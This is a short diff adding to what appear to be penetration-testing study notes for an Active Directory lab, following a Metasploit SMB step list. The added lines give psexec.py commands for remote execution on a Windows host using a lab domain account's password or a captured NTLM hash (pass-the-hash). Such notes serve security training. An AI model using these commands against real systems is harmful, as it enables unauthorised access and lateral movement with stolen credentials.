@@ -49,4 +49,8 @@ If you get a hash from responder, you can relay the hash to other shares without
 7. set smb pass and paste what you copied
 8. exploit
 
+### psexec.py
+1. ```psexec.py MARVEL/fcastle:'Password1'@IP```
+2. alternative -- ```psexec.py MARVEL/fcastle:@IP``` then paste the password
+3. alternative using hash -- ```psexec.py administrator@IP -hashes (hash)```
 
